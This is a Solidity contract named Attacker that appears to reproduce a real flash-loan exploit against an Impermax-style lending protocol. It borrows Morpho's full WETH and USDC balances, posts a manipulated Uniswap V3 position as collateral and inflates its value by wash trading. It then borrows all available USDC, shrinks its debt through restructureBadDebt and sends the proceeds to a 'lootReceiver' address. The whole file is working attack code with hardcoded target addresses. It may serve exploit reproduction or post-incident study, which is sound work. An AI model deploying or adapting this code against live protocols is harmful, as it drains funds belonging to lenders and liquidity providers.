// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IMorpho} from "./interfaces/IMorpho.sol";
import {IERC20, IWETH} from "./interfaces/IERC20.sol";
import {ITokenizedUniswapV3Position} from "./interfaces/ITokenizedUniswapV3Position.sol";
import {IUniswapV3Pool} from "./interfaces/IUniswapV3Pool.sol";
import {IBorrowable} from "./interfaces/IBorrowable.sol";
import {ICollateral} from "./interfaces/ICollateral.sol";
import {TickMath} from "./libraries/TickMath.sol";
import {LiquidityAmounts} from "./libraries/LiquidityAmounts.sol";
import {CollateralMath} from "./libraries/CollateralMath.sol";
import {INFTLP} from "./interfaces/INFTLP.sol";

contract Attacker {
    using CollateralMath for CollateralMath.PositionObject;

    uint160 private constant sqrtPriceLimitX96_0 = 1461446703485210103287273052203988822378723970341;
    uint160 private constant sqrtPriceLimitX96_1 = 4295128740;
    bool private secondFlashLoan;
    uint256 wethBorrowed;

    address private immutable lootReceiver;
    address private immutable morpho;
    address private immutable weth;

    // values obtained from the attack calldata
    address usdc = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address tUniV3Pos = 0xa68F6075ae62eBD514d1600cb5035fa0E2210ef8;
    address imxBusdc = 0xbC303aCdA8B2a0dCD3D17F05aDDdF854eDd6da59;
    address imxBweth = 0x5d93f216f17c225a8B5fFA34e74B7133436281eE;
    address imxCaddr = 0xc1D49fa32d150B31C4a5bf1Cbf23Cf7Ac99eaF7d;

    uint256 usdcLPAmount = 20000000e6; // 20,000,000 USDC
    int256 firstSwapUsdcAmount = 1000e6; // 1000 USDC
    int256 probeWashAmount = 400000e6; // 400,000 USDC

    IERC20 USDC = IERC20(usdc);
    IWETH WETH;
    ITokenizedUniswapV3Position tokenizedUniV3Pos = ITokenizedUniswapV3Position(tUniV3Pos);
    IBorrowable imxBUSDC = IBorrowable(imxBusdc);
    ICollateral imxC = ICollateral(imxCaddr);

    uint24 lowLiquidityPoolFee = 200;
    uint24 highLiquidityPoolFee = 500;

    constructor(address _lootReceiver, address _morpho, address _weth) {
        lootReceiver = _lootReceiver;
        morpho = _morpho;
        weth = _weth;
        WETH = IWETH(weth);
    }

    function attack() external {
        // flashloan WETH from Morpho
        uint256 morphoWETHBalance = WETH.balanceOf(morpho);
        WETH.approve(morpho, morphoWETHBalance);
        IMorpho(morpho).flashLoan(weth, morphoWETHBalance, "");

        // convert loot to WETH
        uint256 thisUSDCBalance = IERC20(usdc).balanceOf(address(this));
        IUniswapV3Pool pool500 = IUniswapV3Pool(tokenizedUniV3Pos.getPool(highLiquidityPoolFee));
        pool500.swap(address(this), false, int256(thisUSDCBalance), sqrtPriceLimitX96_0, abi.encode(weth, usdc));

        // convert WETH to ETH
        uint256 thisWETHBalance = WETH.balanceOf(address(this));
        WETH.withdraw(thisWETHBalance);

        // transfer ETH to loot receiver
        (bool success,) = payable(lootReceiver).call{value: thisWETHBalance}("");
        require(success, "Transfer failed");
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external {
        if (!secondFlashLoan) {
            // here we are getting the WETH from the first flashloan
            secondFlashLoan = true;
            wethBorrowed = assets;

            // flashloan USDC from Morpho
            uint256 morphoUSDCBalance = USDC.balanceOf(morpho);
            USDC.approve(morpho, morphoUSDCBalance);
            IMorpho(morpho).flashLoan(address(USDC), morphoUSDCBalance, data);
        } else {
            // here we are getting the USDC from the second flashloan

            // getting low liquidity pool which will be used for the attack
            IUniswapV3Pool pool = IUniswapV3Pool(tokenizedUniV3Pos.getPool(lowLiquidityPoolFee));
            int24 poolTickSpacing = pool.tickSpacing();

            // current tick of the pool
            (, int24 baseTick,,,,,) = pool.slot0();

            // here we are swapping relatively big amount to see how much the price will move
            (int256 priceMovedWithAmount0,) =
                pool.swap(address(this), false, firstSwapUsdcAmount, sqrtPriceLimitX96_0, abi.encode(weth, usdc));

            (uint160 movedSqrtPriceX96, int24 movedTick,,,,,) = pool.slot0();

            // tickLower defined at 2.5% higher than the base tick
            int256 tickMultiplierBase = 1000;
            int256 tickLowerMultiplier;
            if (baseTick < 0) {
                tickLowerMultiplier = tickMultiplierBase - 25;
            } else {
                tickLowerMultiplier = tickMultiplierBase + 25;
            }
            int24 tickLower = int24(int256(baseTick) * tickLowerMultiplier / tickMultiplierBase);
            tickLower = tickLower - (tickLower % poolTickSpacing);

            // tickUpper defined as tick at moved price
            int24 tickUpper = movedTick + poolTickSpacing - (movedTick % poolTickSpacing);

            // fixing the order of the ticks
            if (tickLower > tickUpper) (tickLower, tickUpper) = (tickUpper, tickLower);

            // calculate the amount of liquidity we want to provide
            uint128 poolMintAmount = LiquidityAmounts.getLiquidityForAmounts(
                movedSqrtPriceX96,
                TickMath.getSqrtRatioAtTick(tickLower),
                TickMath.getSqrtRatioAtTick(tickUpper),
                wethBorrowed,
                usdcLPAmount
            );

            // provide liquidity to the pool
            pool.mint(tUniV3Pos, tickLower, tickUpper, poolMintAmount, abi.encode(weth, usdc));

            // minting the tokenized position
            uint256 newTokenId = tokenizedUniV3Pos.mint(address(this), lowLiquidityPoolFee, tickLower, tickUpper);

            // transferring the tokenized position to the imxC contract to be used as collateral
            tokenizedUniV3Pos.transferFrom(address(this), imxCaddr, newTokenId);

            // minting collateral position
            imxC.mint(address(this), newTokenId);

            pool.swap(address(this), true, -probeWashAmount, sqrtPriceLimitX96_1, abi.encode(weth, usdc));
            int256 backProbeWashAmount = addFee(probeWashAmount, lowLiquidityPoolFee);
            pool.swap(address(this), false, backProbeWashAmount, sqrtPriceLimitX96_0, abi.encode(weth, usdc));

            tokenizedUniV3Pos.reinvest(newTokenId, address(this));

            // wash trading to acrue fees
            int256 washAmount = int256(usdcLPAmount * 97 / 100); // 19,400,000 USDC
            int256 backWashAmount = addFee(washAmount, lowLiquidityPoolFee);
            for (uint16 i = 0; i < 100; i++) {
                pool.swap(address(this), true, -washAmount, sqrtPriceLimitX96_1, abi.encode(weth, usdc));
                pool.swap(address(this), false, backWashAmount, sqrtPriceLimitX96_0, abi.encode(weth, usdc));
            }

            pool.swap(address(this), false, 100000, sqrtPriceLimitX96_0, abi.encode(weth, usdc));

            uint256 liquidationPenalty = imxC.liquidationPenalty();
            uint256 safetyMarginSqrt = imxC.safetyMarginSqrt();
            (uint256 sqrtPriceX96, INFTLP.RealXYs memory realXYs) =
                INFTLP(tUniV3Pos).getPositionData(newTokenId, safetyMarginSqrt);

            uint256 debtX = IBorrowable(imxBweth).currentBorrowBalance(newTokenId);
            // here we use usdcLPAmount as placeholder, we will calculate the real amount later
            uint256 debtY = usdcLPAmount;

            // here we reversing the protocol math to find how much USDC we can borrow against the collateral
            CollateralMath.PositionObject memory positionObject =
                CollateralMath.newPosition(realXYs, sqrtPriceX96, debtX, debtY, liquidationPenalty, safetyMarginSqrt);
            {
                CollateralMath.Price price = CollateralMath.Price.LOWEST;
                uint256 collateralValue = CollateralMath.getCollateralValue(positionObject, price);
                uint256 debtYCalculated = CollateralMath.getDebtY(positionObject, price, debtX, collateralValue);
                if (debtYCalculated < debtY) {
                    debtY = debtYCalculated;
                }
            }
            {
                CollateralMath.Price price = CollateralMath.Price.HIGHEST;
                uint256 collateralValue = CollateralMath.getCollateralValue(positionObject, price);
                uint256 debtYCalculated = CollateralMath.getDebtY(positionObject, price, debtX, collateralValue);
                if (debtYCalculated < debtY) {
                    debtY = debtYCalculated;
                }
            }
            debtY = debtY * 1e18 / liquidationPenalty;

            uint256 imxBUSDC_USDCBalance = USDC.balanceOf(address(imxBUSDC));

            // here we providing borrowable liquidity which we will borrow later
            USDC.transfer(address(imxBUSDC), debtY - imxBUSDC_USDCBalance);
            imxBUSDC.mint(address(this));

            // borrowing all available USDC from imxBUSDC
            imxBUSDC_USDCBalance = USDC.balanceOf(address(imxBUSDC));
            imxBUSDC.borrow(newTokenId, address(this), imxBUSDC_USDCBalance, "");

            // here reinvest collects accrued fees and reinvests them
            // at this point our borrow position is underwater
            tokenizedUniV3Pos.reinvest(newTokenId, address(this));

            // here our borrow balance will decrease, no liquidation triggered
            imxC.restructureBadDebt(newTokenId);

            // here we are repaying the rest of borrowed amount
            uint256 currentBorrowBalance = imxBUSDC.currentBorrowBalance(newTokenId);
            USDC.transfer(address(imxBUSDC), currentBorrowBalance);
            imxBUSDC.borrow(newTokenId, address(this), 0, "");

            // redeem the collateral position since we already paid the debt
            imxC.redeem(address(this), newTokenId, 1e18);

            // redeem tokenized position and getting back the USDC and WETH we provided
            tokenizedUniV3Pos.redeem(address(this), newTokenId);

            // moving back the price of the lowLiquidityPool to the original state
            int256 priceMoveBackAmount = addFee(-priceMovedWithAmount0, lowLiquidityPoolFee);
            pool.swap(address(this), true, priceMoveBackAmount, sqrtPriceLimitX96_1, abi.encode(weth, usdc));

            // redeem the USDC we provided to the imxBUSDC as lender
            uint256 toTransfer = USDC.balanceOf(address(imxBUSDC)) * 1e18 / imxBUSDC.exchangeRate();
            imxBUSDC.transfer(address(imxBUSDC), toTransfer);
            imxBUSDC.redeem(address(this));

            // restructure balance if we don't have enough WETH to pay back the flashloan
            IUniswapV3Pool pool500 = IUniswapV3Pool(tokenizedUniV3Pos.getPool(highLiquidityPoolFee));
            uint256 thisWETHBalance = WETH.balanceOf(address(this));
            if (wethBorrowed > thisWETHBalance) {
                pool500.swap(
                    address(this),
                    false,
                    int256(wethBorrowed - thisWETHBalance) * -1,
                    sqrtPriceLimitX96_0,
                    abi.encode(weth, usdc)
                );
            }
        }
    }

    function addFee(int256 amount, uint24 fee) internal pure returns (int256) {
        return amount + ((amount * int256(int24(fee))) / int256(int24(1000000 - fee)));
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) public {
        (address token0, address token1) = abi.decode(data, (address, address));

        if (amount0Delta > 0) {
            IERC20(token0).transfer(msg.sender, uint256(amount0Delta));
        }
        if (amount1Delta > 0) {
            IERC20(token1).transfer(msg.sender, uint256(amount1Delta));
        }
    }

    function uniswapV3MintCallback(uint256 amount0Delta, uint256 amount1Delta, bytes calldata data) public {
        (address token0, address token1) = abi.decode(data, (address, address));

        if (amount0Delta > 0) {
            IERC20(token0).transfer(msg.sender, amount0Delta);
        }
        if (amount1Delta > 0) {
            IERC20(token1).transfer(msg.sender, amount1Delta);
        }
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }

    receive() external payable {}
}
